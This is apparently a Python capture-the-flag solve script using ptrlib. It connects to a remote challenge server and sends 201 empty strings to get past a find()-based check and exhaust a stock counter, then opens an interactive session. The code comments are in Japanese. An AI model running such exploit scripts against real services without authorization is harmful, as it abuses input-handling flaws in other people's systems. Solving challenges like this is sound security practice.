from ptrlib import *


def send_character(char):
    io.sendlineafter("your choice> ", bytes(char, "utf-8"))


io = Socket("nc 34.170.146.252 45305")

# 10行飛ばす
for _ in range(10):
    print(io.recvline())

# 空文字列を送信してfind()メソッドをごまかす
stock_size = 30 + 60 + 20 + 50 + 40 + 1

for _ in range(stock_size):
    send_character("")
    print(io.recvline())
    print(io.recvline())

print(io.interactive())
